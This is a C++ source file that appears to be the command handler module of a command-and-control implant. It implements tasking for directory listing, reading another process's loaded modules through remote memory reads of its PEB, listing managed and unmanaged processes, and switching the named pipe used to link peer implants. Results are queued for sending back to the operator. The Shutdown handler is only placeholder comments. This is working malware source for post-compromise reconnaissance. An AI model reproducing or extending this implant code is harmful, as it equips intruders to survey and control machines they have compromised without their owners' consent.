#include <core/include/commands.hpp>
#include <core/dotnet.hpp>

namespace Commands {

    VOID DirectoryList (_parser *const parser) {
        HEXANE

        _stream *out    = Stream::CreateStreamWithHeaders(TypeResponse);
        LPSTR query     = { };
        LPSTR path      = { };
        ULONG length    = { };

        HANDLE file             = { };
        WIN32_FIND_DATAA head   = { };
        ULARGE_INTEGER file_size = { };
        SYSTEMTIME access_time   = { };
        SYSTEMTIME sys_time      = { };

        Stream::PackDword(out, CommandDir);

        query = Parser::UnpackString(parser, nullptr);
        path = R_CAST(char*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH));

        if (query[0] == PERIOD) {
            if (!(length = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path))) {
                return_defer(ERROR_DIRECTORY);
            }
            if (path[length - 1] != BSLASH) {
                path[length++] = BSLASH;
            }
            path[length++]  = ASTER;
            path[length]    = NULTERM;

        } else {
            x_memcpy(path, query, MAX_PATH);
        }

        if ((file = Ctx->win32.FindFirstFileA(path, &head)) == INVALID_HANDLE_VALUE) {
            return_defer(ERROR_FILE_NOT_FOUND);
        }

        do {
            if(
                !Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time) ||
                !Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time)) {
                return_defer(ERROR_INVALID_TIME);
            }

            if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                Stream::PackDword(out, TRUE);

            } else {
                file_size.HighPart   = head.nFileSizeHigh;
                file_size.LowPart    = head.nFileSizeLow;

                Stream::PackDword(out, FALSE);
                Stream::PackDword64(out, file_size.QuadPart);
            }

            Stream::PackDword(out, access_time.wMonth);
            Stream::PackDword(out, access_time.wDay);
            Stream::PackDword(out, access_time.wYear);
            Stream::PackDword(out, sys_time.wHour);
            Stream::PackDword(out, sys_time.wMinute);
            Stream::PackDword(out, sys_time.wSecond);
            Stream::PackString(out, head.cFileName);
        } while (Ctx->win32.FindNextFileA(file, &head) != 0);

        Message::OutboundQueue(out);

        defer:
        if (file) { Ctx->win32.FindClose(file); }
        if (path) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, path); }
    }

    VOID processModules (_parser *const parser) {
        HEXANE

        _stream *out                    = Stream::CreateStreamWithHeaders(TypeResponse);
        PPEB_LDR_DATA loads             = { };
        PROCESS_BASIC_INFORMATION pbi   = { };
        HANDLE process                  = { };
        ULONG pid                       = { };

        PLIST_ENTRY head 	            = { };
        PLIST_ENTRY entry               = { };
        LDR_DATA_TABLE_ENTRY module     = { };

        CHAR modname_a[MAX_PATH] 		= { };
        WCHAR modname_w[MAX_PATH] 	    = { };

        INT count = 0;
        SIZE_T size = 0;

        Stream::PackDword(out, CommandMods);

        if (
            !(pid = Process::GetProcessIdByName(Parser::UnpackString(parser, nullptr))) ||
            !NT_SUCCESS(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid))) {
            return_defer(ERROR_PROCESS_IS_PROTECTED);
        }

        if (NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {

            if (
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PPEB_LDR_DATA), &size)) ||
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr))) {
                return_defer(ntstatus);
            }

            head = &loads->InMemoryOrderModuleList;
            while (entry != head) {
                if (
                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr)) ||
                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size)) ||
                    size != module.FullDllName.Length) {
                    return_defer(ntstatus);
                }

                if (module.FullDllName.Length > 0) {
                    size = x_wcstombs(modname_a, modname_w, module.FullDllName.Length);

                    Stream::PackString(out, modname_a);
                    Stream::PackDword64(out, R_CAST(UINT64, module.DllBase));
                    count++;
                }

                x_memset(modname_w, 0, MAX_PATH);
                x_memset(modname_a, 0, MAX_PATH);

                entry = module.InMemoryOrderLinks.Flink;
            }
        }

        Message::OutboundQueue(out);
        defer:
    }

    VOID ProcessList(_parser *const parser) {
        HEXANE

        _stream *stream             = Stream::CreateStreamWithHeaders(TypeResponse);

        PROCESSENTRY32 entries      = { };
        HANDLE snapshot             = { };
        HANDLE process              = { };

        IEnumUnknown *enums         = { };
        ICLRMetaHost *meta          = { };
        ICLRRuntimeInfo *runtime    = { };

        WCHAR buffer[1024];
        DWORD Size  = 0;
        DWORD Type  = Parser::UnpackDword(parser); // listing managed/un-managed processes

        Size            = ARRAY_LEN(buffer);
        entries.dwSize  = sizeof(PROCESSENTRY32);

        if (
            (snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE ||
            !Ctx->win32.Process32First(snapshot, &entries)) {
            return;
        }

        do {
            BOOL isManaged  = FALSE;
            BOOL isLoaded   = FALSE;

            CLIENT_ID Cid           = { };
            OBJECT_ATTRIBUTES Attr  = { };

            Cid.UniqueThread    = nullptr;
            Cid.UniqueProcess   = R_CAST(HANDLE, entries.th32ProcessID);

            InitializeObjectAttributes(&Attr, nullptr, 0, nullptr, nullptr);
            if (!NT_SUCCESS(Ctx->Nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &Attr, &Cid))) {
                continue;
            }

            if (SUCCEEDED(Ctx->CLR.CLRCreateInstance(GUID_CLSID_CLRMetaHost, GUID_IID_ICLRMetaHost, R_CAST(void**, &meta)))) {
                if (SUCCEEDED((meta)->lpVtbl->EnumerateInstalledRuntimes(meta, &enums))) {

                    while (S_OK == enums->Next(0x1, R_CAST(IUnknown**, &runtime), nullptr)) {
                        if (runtime->lpVtbl->IsLoaded(runtime, process, &isLoaded) == S_OK && isLoaded == TRUE) {
                            isManaged = TRUE;

                            if (Type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &Size))) {
                                Stream::PackDword(stream, entries.th32ProcessID);
                                Stream::PackString(stream, entries.szExeFile);
                                Stream::PackWString(stream, buffer);
                            }
                        }
                        runtime->lpVtbl->Release(runtime);
                    }
                }
            }

            if (!isManaged && Type == UNMANAGED_PROCESS) {
                Stream::PackDword(stream, entries.th32ProcessID);
                Stream::PackString(stream, entries.szExeFile);
            }

            if (meta)       { meta->lpVtbl->Release(meta); }
            if (runtime)    { runtime->lpVtbl->Release(runtime); }
            if (enums)      { enums->Release(); }

            Ctx->Nt.NtClose(process);

        } while (Ctx->win32.Process32Next(snapshot, &entries));
        if (snapshot) { Ctx->Nt.NtClose(snapshot); }
    }

    VOID Shutdown (_parser *const parser) {
        HEXANE

        // Send final message
        // Zero/Free all memory
        // Exit
        ntstatus = ERROR_EXIT;
    }

    VOID UpdatePeer(_parser *parser) {
        HEXANE

        auto nameLength = x_wcslen(Ctx->Config.IngressPipename) * sizeof(WCHAR);

        if (Ctx->Config.IngressPipename) {
            x_memset(Ctx->Config.IngressPipename, 0, nameLength);
            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Ctx->Config.IngressPipename);
        }

        Parser::ParserWcscpy(parser, &Ctx->Config.IngressPipename, nullptr);
    }
}
